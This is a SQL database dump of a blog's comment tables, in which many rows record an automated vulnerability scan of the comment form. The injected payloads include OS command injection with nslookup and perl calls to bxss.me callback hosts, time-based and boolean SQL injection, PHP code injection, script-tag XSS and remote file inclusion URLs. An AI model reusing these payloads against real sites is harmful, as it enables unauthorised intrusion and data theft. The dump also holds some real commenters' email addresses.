(380, 15, '${@print(md5(31337))}\\', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:46', 3),
(381, 15, 'e', '(nslookup hitprihaagguz17c1e.bxss.me||perl -e \"gethostbyname(\'hitprihaagguz17c1e.bxss.me\')\")', 'e', 0, '2020-09-14 12:10:47', 3),
(382, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:47', 3),
(383, 15, 'e', 'bxss.me', 'e', 0, '2020-09-14 12:10:48', 3),
(384, 15, '\'.print(md5(31337)).\'', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:49', 3),
(385, 15, 'e', '$(nslookup hitqdstspvskcb9612.bxss.me||perl -e \"gethostbyname(\'hitqdstspvskcb9612.bxss.me\')\")', 'e', 0, '2020-09-14 12:10:49', 3),
(386, 15, 'e', 'VvkEQptL', 'e', 0, '2020-09-14 12:10:50', 3),
(387, 15, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:51', 3),
(388, 15, 'e', '&(nslookup hitvoibcpmzms8e2be.bxss.me||perl -e \"gethostbyname(\'hitvoibcpmzms8e2be.bxss.me\')\")&\'\\\"`0&(nslookup hitvoibcpmzms8e2be.bxss.me||perl -e \"gethostbyname(\'hitvoibcpmzms8e2be.bxss.me\')\")&`\'', 'e', 0, '2020-09-14 12:10:52', 3),
(389, 15, 'e', '-1 OR 2+551-551-1=0+0+0+1 -- ', 'e', 0, '2020-09-14 12:10:53', 3),
(390, 15, '1some_inexistent_file_with_long_name.jpg', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:53', 3),
(391, 15, 'e', '|(nslookup hitvhvfjmvgkk31119.bxss.me||perl -e \"gethostbyname(\'hitvhvfjmvgkk31119.bxss.me\')\")', 'e', 0, '2020-09-14 12:10:54', 3),
(392, 15, 'e', '-1 OR 2+520-520-1=0+0+0+1', 'e', 0, '2020-09-14 12:10:55', 3),
(393, 15, 'Http://bxss.me/t/fit.txt', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:56', 3),
(394, 15, 'e', '`(nslookup hittgjryzctrd2bdd6.bxss.me||perl -e \"gethostbyname(\'hittgjryzctrd2bdd6.bxss.me\')\")`', 'e', 0, '2020-09-14 12:10:57', 3),
(395, 15, 'e', '-1\' OR 2+389-389-1=0+0+0+1 -- ', 'e', 0, '2020-09-14 12:10:58', 3),
(396, 15, 'http://bxss.me/t/fit.txt?.jpg', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:58', 3),
(397, 15, 'e', ';(nslookup hitxebtqjpoxw9babc.bxss.me||perl -e \"gethostbyname(\'hitxebtqjpoxw9babc.bxss.me\')\")|(nslookup hitxebtqjpoxw9babc.bxss.me||perl -e \"gethostbyname(\'hitxebtqjpoxw9babc.bxss.me\')\")&(nslookup hitxebtqjpoxw9babc.bxss.me||perl -e \"gethostbyname(\'hitxebtqjpoxw9babc.bxss.me\')\")', 'e', 0, '2020-09-14 12:11:00', 3),
(398, 15, 'e', '-1\' OR 2+688-688-1=0+0+0+1 or \'pzHJ0yyU\'=\'', 'e', 0, '2020-09-14 12:11:00', 3),
(399, 15, 'bxss.me', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:01', 3),
(400, 15, 'e', '-1\" OR 2+186-186-1=0+0+0+1 -- ', 'e', 0, '2020-09-14 12:11:03', 3),
(401, 15, 'echo rjtxod$()\\ cdkmso\\nz^xyu||a #\' &echo rjtxod$()\\ cdkmso\\nz^xyu||a #|\" &echo rjtxod$()\\ cdkmso\\nz^xyu||a #', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:03', 3),
(402, 15, 'e', '220\'', 'e', 0, '2020-09-14 12:11:05', 3),
(403, 15, '&echo jocayk$()\\ qtllql\\nz^xyu||a #\' &echo jocayk$()\\ qtllql\\nz^xyu||a #|\" &echo jocayk$()\\ qtllql\\nz^xyu||a #', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:06', 3),
(404, 15, '|echo vmarul$()\\ aefiln\\nz^xyu||a #\' |echo vmarul$()\\ aefiln\\nz^xyu||a #|\" |echo vmarul$()\\ aefiln\\nz^xyu||a #', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:08', 3),
(405, 15, 'e', 'if(now()=sysdate(),sleep(12),0)', 'e', 0, '2020-09-14 12:11:10', 3),
(406, 15, '(nslookup hitriybfpniegc82c8.bxss.me||perl -e \"gethostbyname(\'hitriybfpniegc82c8.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:10', 3),
(407, 15, '$(nslookup hitloyqhzixwy4c493.bxss.me||perl -e \"gethostbyname(\'hitloyqhzixwy4c493.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:13', 3),
(408, 15, '&(nslookup hitgqbnoutayp569f9.bxss.me||perl -e \"gethostbyname(\'hitgqbnoutayp569f9.bxss.me\')\")&\'\\\"`0&(nslookup hitgqbnoutayp569f9.bxss.me||perl -e \"gethostbyname(\'hitgqbnoutayp569f9.bxss.me\')\")&`\'', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:15', 3),
(409, 15, 'e', '0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z', 'e', 0, '2020-09-14 12:11:15', 3),
(410, 15, '|(nslookup hituybohosiofcb63b.bxss.me||perl -e \"gethostbyname(\'hituybohosiofcb63b.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:18', 3),
(411, 15, 'e', '0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z', 'e', 0, '2020-09-14 12:11:20', 3),
(412, 15, '`(nslookup hitpyitdjxgwk1517f.bxss.me||perl -e \"gethostbyname(\'hitpyitdjxgwk1517f.bxss.me\')\")`', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:20', 3),
(413, 15, ';(nslookup hitpxbjndifeuff9fb.bxss.me||perl -e \"gethostbyname(\'hitpxbjndifeuff9fb.bxss.me\')\")|(nslookup hitpxbjndifeuff9fb.bxss.me||perl -e \"gethostbyname(\'hitpxbjndifeuff9fb.bxss.me\')\")&(nslookup hitpxbjndifeuff9fb.bxss.me||perl -e \"gethostbyname(\'hitpxbjndifeuff9fb.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:23', 3),
(414, 15, 'e', '(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/', 'e', 0, '2020-09-14 12:11:24', 3),
(415, 15, 'e', '1 waitfor delay \'0:0:12\' -- ', 'e', 0, '2020-09-14 12:11:29', 3),
(416, 15, 'e', 'yTww7dqS\'; waitfor delay \'0:0:12\' -- ', 'e', 0, '2020-09-14 12:11:34', 3),
(417, 15, 'e', 'V3EXpDAP\' OR 72=(SELECT 72 FROM PG_SLEEP(12))--', 'e', 0, '2020-09-14 12:11:39', 3),
(418, 15, 'e', 'lxjsfX48\') OR 878=(SELECT 878 FROM PG_SLEEP(12))--', 'e', 0, '2020-09-14 12:11:44', 3),
(419, 15, 'e', 'zGC790EF\')) OR 31=(SELECT 31 FROM PG_SLEEP(12))--', 'e', 0, '2020-09-14 12:11:49', 3),
(420, 15, 'e', 'sample@email.tst\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'', 'e', 0, '2020-09-14 12:11:54', 3),
(421, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:11:59', 3),
(422, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:01', 3),
(423, 15, '027C626t', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:03', 3),
(424, 15, '-1 OR 2+575-575-1=0+0+0+1 -- ', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:06', 3),
(425, 15, '-1 OR 2+581-581-1=0+0+0+1', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:08', 3),
(426, 15, '-1\' OR 2+624-624-1=0+0+0+1 -- ', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:10', 3),
(427, 15, '-1\' OR 2+708-708-1=0+0+0+1 or \'GACYQJHY\'=\'', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:12', 3),
(428, 15, '-1\" OR 2+446-446-1=0+0+0+1 -- ', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:15', 3),
(429, 15, '371\'', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:17', 3),
(430, 15, 'if(now()=sysdate(),sleep(12),0)', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:22', 3),
(431, 15, 'e', 'sample@email.tst', 'blogcomment_save', 0, '2020-09-14 12:12:27', 3),
(432, 15, '0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:27', 3),
(433, 15, 'e', 'sample@email.tst', 'blogcomment_save', 0, '2020-09-14 12:12:29', 3),
(434, 15, '0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:32', 3),
(435, 15, 'e', 'sample@email.tst', 'blogcomment_save/.', 0, '2020-09-14 12:12:32', 3),
(436, 15, 'e', 'blogcomment_save', 'e', 0, '2020-09-14 12:12:35', 3),
(437, 15, '(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:37', 3),
(438, 15, 'e', 'blogcomment_save', 'e', 0, '2020-09-14 12:12:37', 3),
(439, 15, 'e', 'blogcomment_save/.', 'e', 0, '2020-09-14 12:12:39', 3),
(440, 15, 'e', 'sample@email.tst', 'e\'\"()&%<acx><ScRiPt >Swet(9665)</ScRiPt>', 0, '2020-09-14 12:12:40', 3),
(441, 15, 'blogcomment_save', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:40', 3),
(442, 15, '1 waitfor delay \'0:0:12\' -- ', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:42', 3),
(443, 15, 'e', 'sample@email.tst', '\'\"()&%<acx><ScRiPt >Swet(9268)</ScRiPt>', 0, '2020-09-14 12:12:42', 3),
(444, 15, 'blogcomment_save', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:42', 3),
(445, 15, 'e', 'sample@email.tst', 'e9843117', 0, '2020-09-14 12:12:43', 3),
(446, 15, 'blogcomment_save/.', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:45', 3),
(447, 15, 'e', 'sample@email.tst\'\"()&%<acx><ScRiPt >Swet(9988)</ScRiPt>', 'e', 0, '2020-09-14 12:12:45', 3),
(448, 15, 'w0LflfTR\'; waitfor delay \'0:0:12\' -- ', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:47', 3),
(449, 15, 'e', '\'\"()&%<acx><ScRiPt >Swet(9006)</ScRiPt>', 'e', 0, '2020-09-14 12:12:48', 3),
(450, 15, 'e', 'sample@email.tst9127835', 'e', 0, '2020-09-14 12:12:50', 3),
(451, 15, 'e\'\"()&%<acx><ScRiPt >Swet(9094)</ScRiPt>', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:52', 3),
(452, 15, 'JgkbOvU9\' OR 625=(SELECT 625 FROM PG_SLEEP(12))--', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:54', 3),
(453, 15, '\'\"()&%<acx><ScRiPt >Swet(9833)</ScRiPt>', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:54', 3),
(454, 15, 'e9037778', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:56', 3),
(455, 15, 'XHwYpWev\') OR 45=(SELECT 45 FROM PG_SLEEP(12))--', 'sample@email.tst', 'e', 0, '2020-09-14 12:12:59', 3),
(456, 15, 'FdSO4bCC\')) OR 912=(SELECT 912 FROM PG_SLEEP(12))--', 'sample@email.tst', 'e', 0, '2020-09-14 12:13:04', 3),
(457, 15, 'e\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'', 'sample@email.tst', 'e', 0, '2020-09-14 12:13:10', 3),
(458, 0, '0', '0', '0', 0, '2020-09-14 12:52:58', 3),
(459, 0, '0', '0', '0', 0, '2020-09-14 12:54:09', 3),
(460, 0, '0', '0', '0', 0, '2020-09-14 12:54:11', 3),
(461, 0, '0', '0', '0', 0, '2020-09-14 12:54:12', 3),
(462, 0, '0', '0', '0', 0, '2020-09-14 12:54:15', 3),
(463, 0, '0', '0', '0', 0, '2020-09-14 12:54:16', 3),
(464, 0, '0', '0', '0', 0, '2020-09-14 12:54:18', 3),
(465, 0, '0', '0', '0', 0, '2020-09-14 12:54:20', 3),
(466, 0, '0', '0', '0', 0, '2020-09-14 12:54:22', 3),
(467, 0, '0', '0', '0', 0, '2020-09-14 12:54:23', 3),
(468, 0, '0', '0', '0', 0, '2020-09-14 12:54:25', 3),
(469, 0, '0', '0', '0', 0, '2020-09-14 12:54:26', 3),
(470, 0, '0', '0', '0', 0, '2020-09-14 12:54:27', 3),
(471, 0, '0', '0', '0', 0, '2020-09-14 12:54:29', 3),
(472, 0, '0', '0', '0', 0, '2020-09-14 12:54:30', 3),
(473, 0, '0', '0', '0', 0, '2020-09-14 12:54:31', 3),
(474, 0, '0', '0', '0', 0, '2020-09-14 12:54:32', 3),
(475, 0, '0', '0', '0', 0, '2020-09-14 12:54:33', 3),
(476, 0, '0', '0', '0', 0, '2020-09-14 12:54:35', 3),
(477, 0, '0', '0', '0', 0, '2020-09-14 12:54:36', 3),
(478, 0, '0', '0', '0', 0, '2020-09-14 12:54:38', 3),
(479, 0, '0', '0', '0', 0, '2020-09-14 12:54:39', 3),
(480, 0, '0', '0', '0', 0, '2020-09-14 12:54:41', 3),
(481, 0, '0', '0', '0', 0, '2020-09-14 12:54:43', 3),
(482, 0, '0', '0', '0', 0, '2020-09-14 12:54:45', 3),
(483, 0, '0', '0', '0', 0, '2020-09-14 12:54:46', 3),
(484, 0, '0', '0', '0', 0, '2020-09-14 12:54:48', 3),
(485, 0, '0', '0', '0', 0, '2020-09-14 12:54:51', 3),
(486, 0, '0', '0', '0', 0, '2020-09-14 12:54:53', 3),
(487, 0, '0', '0', '0', 0, '2020-09-14 12:57:29', 3),
(488, 0, '0', '0', '0', 0, '2020-09-14 12:57:34', 3),
(489, 0, '0', '0', '0', 0, '2020-09-14 12:57:35', 3),
(490, 0, '0', '0', '0', 0, '2020-09-14 12:57:36', 3),
(491, 0, '0', '0', '0', 0, '2020-09-14 12:57:37', 3),
(492, 0, '0', '0', '0', 0, '2020-09-14 12:57:39', 3),
(493, 0, '0', '0', '0', 0, '2020-09-14 12:57:39', 3),
(494, 0, '0', '0', '0', 0, '2020-09-14 12:57:39', 3),
(495, 0, '0', '0', '0', 0, '2020-09-14 12:57:40', 3),
(496, 0, '0', '0', '0', 0, '2020-09-14 12:57:40', 3),
(497, 0, '0', '0', '0', 0, '2020-09-14 12:57:41', 3),
(498, 0, '0', '0', '0', 0, '2020-09-14 12:57:42', 3),
(499, 0, '0', '0', '0', 0, '2020-09-14 12:57:42', 3),
(500, 0, '0', '0', '0', 0, '2020-09-14 12:57:43', 3),
(501, 0, '0', '0', '0', 0, '2020-09-14 12:57:43', 3),
(502, 0, '0', '0', '0', 0, '2020-09-14 12:57:44', 3),
(503, 0, '0', '0', '0', 0, '2020-09-14 12:57:45', 3),
(504, 0, '0', '0', '0', 0, '2020-09-14 12:57:45', 3),
(505, 0, '0', '0', '0', 0, '2020-09-14 12:57:45', 3),
(506, 0, '0', '0', '0', 0, '2020-09-14 12:57:46', 3),
(507, 0, '0', '0', '0', 0, '2020-09-14 12:57:46', 3),
(508, 0, '0', '0', '0', 0, '2020-09-14 12:57:46', 3),
(509, 0, '0', '0', '0', 0, '2020-09-14 12:57:47', 3),
(510, 0, '0', '0', '0', 0, '2020-09-14 12:57:48', 3),
(511, 0, '0', '0', '0', 0, '2020-09-14 12:57:48', 3),
(512, 0, '0', '0', '0', 0, '2020-09-14 12:57:49', 3),
(513, 0, '0', '0', '0', 0, '2020-09-14 12:57:49', 3),
(514, 0, '0', '0', '0', 0, '2020-09-14 12:57:50', 3),
(515, 0, '0', '0', '0', 0, '2020-09-14 12:57:50', 3),
(516, 0, '0', '0', '0', 0, '2020-09-14 12:57:51', 3),
(517, 0, '0', '0', '0', 0, '2020-09-14 12:57:51', 3),
(518, 0, '0', '0', '0', 0, '2020-09-14 12:57:51', 3),
(519, 0, '0', '0', '0', 0, '2020-09-14 12:57:51', 3),
(520, 0, '0', '0', '0', 0, '2020-09-14 12:57:52', 3),
(521, 0, '0', '0', '0', 0, '2020-09-14 12:57:52', 3),
(522, 0, '0', '0', '0', 0, '2020-09-14 12:57:53', 3),
(523, 0, '0', '0', '0', 0, '2020-09-14 12:57:54', 3),
(524, 0, '0', '0', '0', 0, '2020-09-14 12:57:54', 3),
(525, 0, '0', '0', '0', 0, '2020-09-14 12:57:54', 3),
(526, 0, '0', '0', '0', 0, '2020-09-14 12:57:55', 3),
(527, 0, '0', '0', '0', 0, '2020-09-14 12:57:55', 3),
(528, 0, '0', '0', '0', 0, '2020-09-14 12:57:55', 3),
(529, 0, '0', '0', '0', 0, '2020-09-14 12:57:56', 3),
(530, 0, '0', '0', '0', 0, '2020-09-14 12:57:56', 3),
(531, 0, '0', '0', '0', 0, '2020-09-14 12:57:56', 3),
(532, 0, '0', '0', '0', 0, '2020-09-14 12:57:56', 3),
(533, 0, '0', '0', '0', 0, '2020-09-14 12:57:57', 3),
(534, 0, '0', '0', '0', 0, '2020-09-14 12:57:58', 3),
(535, 0, '0', '0', '0', 0, '2020-09-14 12:57:58', 3),
(536, 0, '0', '0', '0', 0, '2020-09-14 12:57:58', 3),
(537, 0, '0', '0', '0', 0, '2020-09-14 12:57:59', 3),
(538, 0, '0', '0', '0', 0, '2020-09-14 12:57:59', 3),
(539, 0, '0', '0', '0', 0, '2020-09-14 12:58:00', 3),
(540, 0, '0', '0', '0', 0, '2020-09-14 12:58:00', 3),
(541, 0, '0', '0', '0', 0, '2020-09-14 12:58:00', 3),
(542, 0, '0', '0', '0', 0, '2020-09-14 12:58:01', 3),
(543, 0, '0', '0', '0', 0, '2020-09-14 12:58:01', 3),
(544, 0, '0', '0', '0', 0, '2020-09-14 12:58:02', 3),
(545, 0, '0', '0', '0', 0, '2020-09-14 12:58:02', 3),
(546, 0, '0', '0', '0', 0, '2020-09-14 12:58:02', 3),
(547, 0, '0', '0', '0', 0, '2020-09-14 12:58:02', 3),
(548, 0, '0', '0', '0', 0, '2020-09-14 12:58:04', 3),
(549, 0, '0', '0', '0', 0, '2020-09-14 12:58:04', 3),
(550, 0, '0', '0', '0', 0, '2020-09-14 12:58:04', 3),
(551, 0, '0', '0', '0', 0, '2020-09-14 12:58:04', 3),
(552, 0, '0', '0', '0', 0, '2020-09-14 12:58:05', 3),
(553, 0, '0', '0', '0', 0, '2020-09-14 12:58:05', 3),
(554, 0, '0', '0', '0', 0, '2020-09-14 12:58:06', 3);
INSERT INTO `blogposts_comments` (`id`, `fid`, `name`, `email`, `comment`, `user_id`, `created_date`, `status`) VALUES
(555, 0, '0', '0', '0', 0, '2020-09-14 12:58:06', 3),
(556, 0, '0', '0', '0', 0, '2020-09-14 12:58:06', 3),
(557, 0, '0', '0', '0', 0, '2020-09-14 12:58:07', 3),
(558, 0, '0', '0', '0', 0, '2020-09-14 12:58:08', 3),
(559, 0, '0', '0', '0', 0, '2020-09-14 12:58:08', 3),
(560, 0, '0', '0', '0', 0, '2020-09-14 12:58:09', 3),
(561, 0, '0', '0', '0', 0, '2020-09-14 12:58:10', 3),
(562, 0, '0', '0', '0', 0, '2020-09-14 12:58:10', 3),
(563, 0, '0', '0', '0', 0, '2020-09-14 12:58:10', 3),
(564, 0, '0', '0', '0', 0, '2020-09-14 12:58:11', 3),
(565, 0, '0', '0', '0', 0, '2020-09-14 12:58:11', 3),
(566, 0, '0', '0', '0', 0, '2020-09-14 12:58:12', 3),
(567, 0, '0', '0', '0', 0, '2020-09-14 12:58:12', 3),
(568, 0, '0', '0', '0', 0, '2020-09-14 12:58:13', 3),
(569, 0, '0', '0', '0', 0, '2020-09-14 12:58:13', 3),
(570, 0, '0', '0', '0', 0, '2020-09-14 12:58:13', 3),
(571, 0, '0', '0', '0', 0, '2020-09-14 12:58:15', 3),
(572, 0, '0', '0', '0', 0, '2020-09-14 12:58:15', 3),
(573, 0, '0', '0', '0', 0, '2020-09-14 12:58:16', 3),
(574, 0, '0', '0', '0', 0, '2020-09-14 12:58:16', 3),
(575, 0, '0', '0', '0', 0, '2020-09-14 12:58:16', 3),
(576, 0, '0', '0', '0', 0, '2020-09-14 12:58:16', 3),
(577, 0, '0', '0', '0', 0, '2020-09-14 12:58:17', 3),
(578, 0, '0', '0', '0', 0, '2020-09-14 12:58:18', 3),
(579, 0, '0', '0', '0', 0, '2020-09-14 12:58:18', 3),
(580, 0, '0', '0', '0', 0, '2020-09-14 12:58:19', 3),
(581, 0, '0', '0', '0', 0, '2020-09-14 12:58:20', 3),
(582, 0, '0', '0', '0', 0, '2020-09-14 12:58:20', 3),
(583, 0, '0', '0', '0', 0, '2020-09-14 12:58:20', 3),
(584, 0, '0', '0', '0', 0, '2020-09-14 12:58:22', 3),
(585, 0, '0', '0', '0', 0, '2020-09-14 12:58:22', 3),
(586, 0, '0', '0', '0', 0, '2020-09-14 12:58:22', 3),
(587, 0, '0', '0', '0', 0, '2020-09-14 12:58:22', 3),
(588, 0, '0', '0', '0', 0, '2020-09-14 12:58:24', 3),
(589, 0, '0', '0', '0', 0, '2020-09-14 12:58:24', 3),
(590, 0, '0', '0', '0', 0, '2020-09-14 12:58:25', 3),
(591, 0, '0', '0', '0', 0, '2020-09-14 12:58:25', 3),
(592, 0, '0', '0', '0', 0, '2020-09-14 12:58:26', 3),
(593, 0, '0', '0', '0', 0, '2020-09-14 12:58:27', 3),
(594, 0, '0', '0', '0', 0, '2020-09-14 12:58:27', 3),
(595, 0, '0', '0', '0', 0, '2020-09-14 12:58:29', 3),
(596, 0, '0', '0', '0', 0, '2020-09-14 12:58:29', 3),
(597, 0, '0', '0', '0', 0, '2020-09-14 12:58:30', 3),
(598, 0, '0', '0', '0', 0, '2020-09-14 12:58:31', 3),
(599, 0, '0', '0', '0', 0, '2020-09-14 12:58:32', 3),
(600, 0, '0', '0', '0', 0, '2020-09-14 12:58:32', 3),
(601, 0, '0', '0', '0', 0, '2020-09-14 12:58:33', 3),
(602, 0, '0', '0', '0', 0, '2020-09-14 12:58:35', 3),
(603, 0, '0', '0', '0', 0, '2020-09-14 12:58:36', 3),
(604, 0, '0', '0', '0', 0, '2020-09-14 12:58:37', 3),
(605, 0, '0', '0', '0', 0, '2020-09-14 12:58:39', 3),
(606, 0, '0', '0', '0', 0, '2020-09-14 12:58:39', 3),
(607, 0, '0', '0', '0', 0, '2020-09-14 12:58:41', 3),
(608, 0, '0', '0', '0', 0, '2020-09-14 12:58:43', 3),
(609, 0, '0', '0', '0', 0, '2020-09-14 12:58:44', 3),
(610, 0, '0', '0', '0', 0, '2020-09-14 12:58:45', 3),
(611, 0, '0', '0', '0', 0, '2020-09-14 12:58:46', 3),
(612, 0, '0', '0', '0', 0, '2020-09-14 12:58:48', 3),
(613, 0, '0', '0', '0', 0, '2020-09-14 12:58:49', 3),
(614, 0, '0', '0', '0', 0, '2020-09-14 12:58:50', 3),
(615, 0, '0', '0', '0', 0, '2020-09-14 12:58:51', 3),
(616, 0, '0', '0', '0', 0, '2020-09-14 12:58:54', 3),
(617, 0, '0', '0', '0', 0, '2020-09-14 12:58:56', 3),
(618, 0, '0', '0', '0', 0, '2020-09-14 12:58:58', 3),
(619, 0, '0', '0', '0', 0, '2020-09-14 12:59:00', 3),
(620, 0, '0', '0', '0', 0, '2020-09-14 12:59:02', 3),
(621, 0, '0', '0', '0', 0, '2020-09-14 12:59:05', 3),
(622, 0, '0', '0', '0', 0, '2020-09-14 12:59:06', 3),
(623, 0, '0', '0', '0', 0, '2020-09-14 12:59:09', 3),
(624, 0, '0', '0', '0', 0, '2020-09-14 12:59:10', 3),
(625, 0, '0', '0', '0', 0, '2020-09-14 12:59:14', 3),
(626, 0, '0', '0', '0', 0, '2020-09-14 12:59:18', 3),
(627, 0, '0', '0', '0', 0, '2020-09-14 12:59:22', 3),
(628, 0, '0', '0', '0', 0, '2020-09-14 12:59:25', 3),
(629, 0, '0', '0', '0', 0, '2020-09-14 12:59:29', 3),
(630, 0, '0', '0', '0', 0, '2020-09-14 12:59:33', 3),
(631, 0, '0', '0', '0', 0, '2020-09-14 12:59:36', 3),
(632, 0, '0', '0', '0', 0, '2020-09-14 12:59:40', 3),
(633, 0, '0', '0', '0', 0, '2020-09-14 12:59:44', 3),
(634, 0, '0', '0', '0', 0, '2020-09-14 12:59:48', 3),
(635, 0, '0', '0', '0', 0, '2020-09-14 12:59:48', 3),
(636, 0, '0', '0', '0', 0, '2020-09-14 12:59:50', 3),
(637, 0, '0', '0', '0', 0, '2020-09-14 12:59:51', 3),
(638, 0, '0', '0', '0', 0, '2020-09-14 12:59:53', 3),
(639, 0, '0', '0', '0', 0, '2020-09-14 12:59:53', 3),
(640, 0, '0', '0', '0', 0, '2020-09-14 12:59:55', 3),
(641, 0, '0', '0', '0', 0, '2020-09-14 12:59:55', 3),
(642, 0, '0', '0', '0', 0, '2020-09-14 12:59:57', 3),
(643, 0, '0', '0', '0', 0, '2020-09-14 12:59:59', 3),
(644, 0, '0', '0', '0', 0, '2020-09-14 12:59:59', 3),
(645, 0, '0', '0', '0', 0, '2020-09-14 13:00:01', 3),
(646, 0, '0', '0', '0', 0, '2020-09-14 13:00:02', 3),
(647, 0, '0', '0', '0', 0, '2020-09-14 13:00:03', 3),
(648, 0, '0', '0', '0', 0, '2020-09-14 13:00:05', 3),
(649, 0, '0', '0', '0', 0, '2020-09-14 13:00:08', 3),
(650, 0, '0', '0', '0', 0, '2020-09-14 13:00:10', 3),
(651, 0, '0', '0', '0', 0, '2020-09-14 13:00:12', 3),
(652, 0, '0', '0', '0', 0, '2020-09-14 13:00:14', 3),
(653, 0, '0', '0', '0', 0, '2020-09-14 13:00:15', 3),
(654, 0, '0', '0', '0', 0, '2020-09-14 13:00:17', 3),
(655, 0, '0', '0', '0', 0, '2020-09-14 13:00:18', 3),
(656, 0, '0', '0', '0', 0, '2020-09-14 13:00:20', 3),
(657, 0, '0', '0', '0', 0, '2020-09-14 13:00:22', 3),
(658, 0, '0', '0', '0', 0, '2020-09-14 13:00:23', 3),
(659, 0, '0', '0', '0', 0, '2020-09-14 13:00:25', 3),
(660, 0, '0', '0', '0', 0, '2020-09-14 13:00:28', 3),
(661, 0, '0', '0', '0', 0, '2020-09-14 13:00:29', 3),
(662, 0, '0', '0', '0', 0, '2020-09-14 13:00:31', 3),
(663, 0, '0', '0', '0', 0, '2020-09-14 13:00:33', 3),
(664, 0, '0', '0', '0', 0, '2020-09-14 13:00:35', 3),
(665, 0, '0', '0', '0', 0, '2020-09-14 13:00:37', 3),
(666, 0, '0', '0', '0', 0, '2020-09-14 13:00:39', 3),
(667, 0, '0', '0', '0', 0, '2020-09-14 13:00:40', 3),
(668, 0, '0', '0', '0', 0, '2020-09-14 13:00:42', 3),
(669, 0, '0', '0', '0', 0, '2020-09-14 13:00:44', 3),
(670, 0, '0', '0', '0', 0, '2020-09-14 13:00:46', 3),
(671, 0, '0', '0', '0', 0, '2020-09-14 13:00:48', 3),
(672, 0, '0', '0', '0', 0, '2020-09-14 13:00:50', 3),
(673, 0, '0', '0', '0', 0, '2020-09-14 13:00:52', 3),
(674, 0, '0', '0', '0', 0, '2020-09-14 13:00:54', 3),
(675, 0, '0', '0', '0', 0, '2020-09-14 13:00:56', 3),
(676, 0, '0', '0', '0', 0, '2020-09-14 13:00:58', 3);

-- --------------------------------------------------------

--
-- Table structure for table `blogposts_comments_kushal`
--

CREATE TABLE `blogposts_comments_kushal` (
  `id` int(11) NOT NULL,
  `fid` int(11) NOT NULL,
  `name` text NOT NULL,
  `email` text NOT NULL,
  `comment` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `status` int(11) NOT NULL DEFAULT '3'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `blogposts_comments_kushal`
--

INSERT INTO `blogposts_comments_kushal` (`id`, `fid`, `name`, `email`, `comment`, `user_id`, `created_date`, `status`) VALUES
(16, 12, 'vinay', 'vinaysagarsd@gmail.com', 'Nice', 0, '2015-10-17 22:58:12', 1),
(17, 12, 'vinay', 'sagar@gmail.com', 'Its True..', 0, '2015-10-19 18:12:04', 1),
(18, 12, 'vinay', 'skjd@gmail.com', 'Test', 0, '2015-10-23 13:15:40', 1),
(19, 15, 'Mousumi Majumdar', 'mousumimajumdar@gmail.com', 'Is it yellow or orange?', 0, '2018-05-30 11:48:09', 3);

-- --------------------------------------------------------

--
-- Table structure for table `blogposts_post`
--

CREATE TABLE `blogposts_post` (
  `id` int(11) NOT NULL,
  `title` text NOT NULL,
  `page_url` text NOT NULL,
  `breif_descp` text NOT NULL,
  `image_path` text NOT NULL,
  `descp` text NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `post_by` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `blogposts_post`
--

INSERT INTO `blogposts_post` (`id`, `title`, `page_url`, `breif_descp`, `image_path`, `descp`, `created_date`, `modified_date`, `status`, `user_id`, `post_by`) VALUES
